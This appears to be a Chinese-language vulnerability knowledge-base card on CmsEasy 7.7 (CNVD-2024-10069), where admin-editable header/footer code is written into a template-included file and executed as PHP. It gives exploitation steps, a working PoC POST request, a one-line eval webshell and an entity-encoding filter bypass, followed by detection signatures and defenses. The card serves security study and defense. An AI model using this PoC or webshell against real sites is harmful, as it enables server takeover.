---
id: web-php-rce-cmseasy-thirdparty-header-footer-write-php
title: CmsEasy 7.7 后台第三方代码 header/footer 写入 header-js.html 被模板包含导致 RCE（CNVD-2024-10069）
type: scenario
domain: web
path: web/php/rce
technique: cmseasy-thirdparty-header-footer-php-write
tags:
- php
- cmseasy
- cms
- file-write
- code-injection
- webshell
- rce
- cnvd-2024-10069
cve: []
affected_versions: CmsEasy 7.7
severity: high
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V362
  verified_at: '2026-11-09T03:02:24+08:00'
  notes: 已对照原文与11张图片核对：POST /index.php?case=thirdparty&act=save&admin_dir=admin&site=default、header/foot 参数、save_action 中 stripslashes(htmlspecialchars_decode(htmlspecialchars_decode(...)))→file_put_contents 到 common/plugins/public/header-js.html/foot-js.html、template/default2020/header.html:26 的 {template_public 'common/plugins/public/header-js.html'} 包含链，以及前台 phpinfo 回显截图均与卡片一致；CNVD-2024-10069 与原文一致；affected_versions 归一为 CmsEasy 7.7（原文环境 CmsEasy_7.7_UTF-8_20240105，图9路径可见）。无 sources/文章ID/长段摘录，路径合法。未验证点：原文以管理员会话演示，最小化 PoC 的 header 值较原文精简（原文保留模板结构+末尾 phpinfo），实际需保持模板标签结构不变。
url: /docs/web/php/rce/web-php-rce-cmseasy-thirdparty-header-footer-write-php/
draft: false
kb_aliases:
- CmsEasy 第三方代码 getshell
- CNVD-2024-10069
- CmsEasy header-js.html 写马
- CmsEasy 后台代码执行
- header/footer 代码注入
---

## 一句话结论

CmsEasy 7.7 后台“设置 → 第三方代码”的页眉/页脚内容只经过 `stripslashes` 与两次 `htmlspecialchars_decode`，随后被 `file_put_contents` 原样写入 `common/plugins/public/header-js.html`、`foot-js.html`；这两个文件被默认模板 `template/default2020/header.html` 通过 `{template_public ...}` 包含并在 PHP 中解析，所以管理员在页眉代码里写入 `<?php phpinfo();?>` 保存后，访问首页即可执行任意 PHP 代码（CNVD-2024-10069）。

## 原理

- **写入点**：后台第三方代码的保存动作在 `thirdparty_admin::save_action()` 中。先对 `front::$post['header']` 执行 `stripslashes(htmlspecialchars_decode(htmlspecialchars_decode(..., ENT_QUOTES), ENT_QUOTES))`（双重 HTML 实体解码 + 去反斜杠），再把结果 `file_put_contents` 到 `ROOT.'/common/plugins/public/header-js.html'`；`foot` 字段同理写入 `foot-js.html`。整个过程没有 PHP 标签过滤、扩展名限制或内容白名单。
- **为什么双重解码危险**：`htmlspecialchars_decode` 会把 `&lt;`、`&gt;`、`&quot;` 等实体还原成 `<`、`>`、`"`，而且连做两次。若业务层/WAF 只对请求做了一次 HTML 实体转义或依赖实体编码，落盘前会被应用自己解回可执行形态——典型的“先过滤后解码”顺序错误。
- **包含链**：`template/default2020/header.html` 在 `<head>` 内用 `{template_public 'common/plugins/public/header-js.html'}` 引用该文件（`functions.php` 中的模板函数同样引用），CMS 模板机制会读取/包含该文件内容，其中 `<?php ... ?>` 由 PHP 解释器执行。后台编辑器里原本就存在 `<?php echo isset($catid)?... ?>` 之类的代码（见第三方代码页头部示例），说明该文件路径的 PHP 标签会被正常解析。
- **为什么管理员可写即 RCE**：CMS 将管理员配置的“第三方代码”视为可信 HTML/JS 片段，但写入的文件处在被 PHP 包含的模板路径；管理员权限 → 写文件 → 首页渲染包含 → 代码执行，形成后台 getshell。此类“后台设置项写入被 include 的固定文件”在多家 CMS 中反复出现。
- 与已有 CmsEasy 模板保存路径穿越漏洞不同：本漏洞不需要 `..` 穿越，写入的是插件公共目录下的固定文件名，靠模板 include 触发解析；两者入口、参数与 sink 都不同。

## 触发条件

- 目标为 CmsEasy 7.7（原文环境 `CmsEasy_7.7_UTF-8_20240105`），使用 `template/default2020` 等包含 `header-js.html`/`foot-js.html` 的模板。
- 攻击者拥有后台管理员会话（弱口令、默认口令、凭据复用或其它后台入口）。
- Web 进程对 `common/plugins/public/` 有写权限；该目录文件会被模板包含并由 PHP 解析。
- 无 WAF 拦截请求中的 `<?php`、`&lt;?php` 或双重编码变体。

## 利用步骤

1. 登录后台（`admin_dir=admin`），确认“设置 → 第三方代码”页面可编辑页眉/页脚代码，并确认模板提示中引用了 `common/plugins/public/header-js.html`。
2. 抓取保存请求，得到路由 `/index.php?case=thirdparty&act=save&admin_dir=admin&site=default`，参数为 `header`、`foot`、`submit`、`dosubmit`。
3. 在 `header` 中放入 PHP 代码（可混在原有模板标签/JS 中，保持页面结构不变），例如 `<?php phpinfo();?>`；也可以把 `&lt;?php ... ?&gt;` 交给双重解码还原。
4. 提交保存；服务端把内容写入 `common/plugins/public/header-js.html`。
5. 访问首页/任意使用该模板的页面，PHP 代码被执行；随后换成一句话木马（如 `<?php @eval($_POST[1]);?>`）获取稳定 WebShell。
6. 若页眉位置被前台缓存，清理 CMS 缓存或换用页脚 `foot` 字段写入再触发。

## PoC

保存请求（最小化，payload 为 phpinfo）：

```http
POST /index.php?case=thirdparty&act=save&admin_dir=admin&site=default HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=<admin session>; loginfalse=0

submit=1&header=%3C%3Fphp%20phpinfo()%3B%3F%3E&foot=&dosubmit=1
```

写入的文件：

```text
<webroot>/common/plugins/public/header-js.html
```

模板包含点：

```text
template/default2020/header.html:
  {template_public 'common/plugins/public/header-js.html'}
```

访问 `http://target/` 后执行 `phpinfo()`；替换 payload 为 `<?php @eval($_POST[1]);?>` 即为 WebShell。

## 变体与关联

- 变体：`foot` 字段写入 `foot-js.html`，同样被 `footer.html` 包含，效果一致。
- 变体：先发 `&lt;?php ... ?&gt;` 等实体编码形式，依赖两次 `htmlspecialchars_decode` 在落盘前还原，可绕过只检查原始 `<` 的过滤。
- 关联：[[web-php-rce-cmseasy-cve-2021-42643-template-save-file-write]]（CmsEasy 7.7.5 后台模板保存 `sid` 路径穿越写 WebShell；不同入口与 sink，均需后台权限）。
- 关联：[[web-php-rce-seacms-admin-ping-post-write-php-code]]（SeaCMS 后台设置项写入 `data/admin/ping.php` 导致代码执行，同类“后台配置落盘到可执行文件”模式）。
- 关联：[[web-php-rce-pbootcms-backend-siteinfo-copy-webshell]]（PbootCMS 后台站点信息插入 PHP + 缓存触发 copy 落地 WebShell）。
- 边界：需要管理员会话；非管理员无法直接利用。原文按 CNVD-2024-10069 记录，未给官方修复版本与补丁 diff。

## 检测与防御

- 输入与落盘：对管理员可编辑的“第三方代码”做 HTML allowlist（禁止 `<script>`/`<?php` 等），或强制把内容当纯文本/JSON 存储；写入目录禁止 PHP 解析（`php_flag engine off`、独立静态域名）。
- 代码层：`header-js.html`/`foot-js.html` 只应存静态 JS/CSS，模板 include 前做扩展名与内容校验；禁止对用户输入连续调用 `htmlspecialchars_decode`。
- 权限：后台强口令 + 二次认证；限制 `admin_dir` 可猜测性；最小化管理员数量。
- 检测特征：`case=thirdparty&act=save` 请求中出现 `<?php`、`&lt;?php`、`%3C%3Fphp` 或双重编码的 PHP 标签；`common/plugins/public/header-js.html`、`foot-js.html` 内容变更与文件完整性告警；首页响应中出现异常 `phpinfo`/webshell 访问。
- 修复：升级到厂商修复版本；在补丁前可将第三方代码改为数据库存储并在模板输出时转义，避免直接写可执行文件。
